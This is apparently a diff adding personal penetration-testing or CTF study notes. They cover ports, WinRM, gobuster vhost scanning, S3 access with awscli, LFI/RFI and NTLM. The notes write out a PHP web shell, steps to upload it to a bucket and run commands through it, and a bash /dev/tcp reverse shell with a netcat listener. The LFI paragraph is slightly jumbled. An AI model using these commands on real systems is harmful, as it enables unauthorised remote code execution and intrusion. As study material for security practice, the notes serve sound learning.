@@ -48,3 +48,71 @@ SHOW tables; : Prints out the available tables inside the current
 database.
 SELECT * FROM {table_name}; : Prints out all the data from the table {table_name}.
 find intrestings data
+
+80/tcp HTTP
+this mean IP avaiable in web browser and can perform web exploit hack.
+
+5985/tcp (HTTP)
+Windows Remote Management, or WinRM
+→ Remotely communicate and interface with hosts
+→ Execute commands remotely on systems that are not local to you but are network accessible.
+→ Monitor, manage and configure servers, operating systems and client machines from a remote location.
+
+22/tcp ssh
+
+adding host entry
+add an entry for {link} in the /etc/hosts file with the corresponding IP address to be able
+to access this domain in our browser.
+echo "{ip} {link}" | sudo tee -a /etc/hosts
+
+gobuster
+vhost : Uses VHOST for brute-forcing
+-w : Path to the wordlist
+-u : Specify the URL
+
+s3 subdomain
+https://docs.aws.amazon.com/AmazonS3/latest/userguide/Welcome.html
+We can interact with this S3 bucket with the aid of the awscli utility. It can be installed on Linux using the
+sudo apt install awscli 
+aws configure
+
+send shell
+create php shell
+echo '<?php system($_GET["cmd"]); ?>' > shell.php
+upload shell
+aws --endpoint=http://{link} s3 cp shell.php s3://{link}
+check shell
+try executing the OS command id using the URL parameter cmd
+
+reverse shell
+create shell.ssh
+bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/1337 0>&1
+listen port to port with netcat
+nc -nvlp 1337
+
+start webserver
+python3 -m http.server 8000
+
+
+LFI or Local File Inclusion occurs when an attacker is able to get a website to include a file that was not
+intended to be an option for this application. A common example is when an application uses the path to a
+file as input. If the application treats this input as trusted, and the required sanitary checks are not
+performed on this input, then the attacker can exploit it by using the ../ string in the inputted file name
+and eventually view sensitive files in the local file system. In some limited cases, an LFI can lead to code
+https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt
+RFI or Remote File Inclusion is similar to LFI but in this case it is possible for an attacker to load a remote
+file on the host using protocols like HTTP, FTP etc.
+execution as well.
+
+NTLM (New Technology Lan Manager)
+The NTLM authentication process is done in the following way :
+1. The client sends the user name and domain name to the server.
+2. The server generates a random character string, referred to as the challenge.
+3. The client encrypts the challenge with the NTLM hash of the user password and sends it back to the
+server.
+4. The server retrieves the user password (or equivalent).
+5. The server uses the hash value retrieved from the security account database to encrypt the challenge
+string. The value is then compared to the value received from the client. If the values match, the client
+is authenticated
+
+Name-Based Virtual hosting
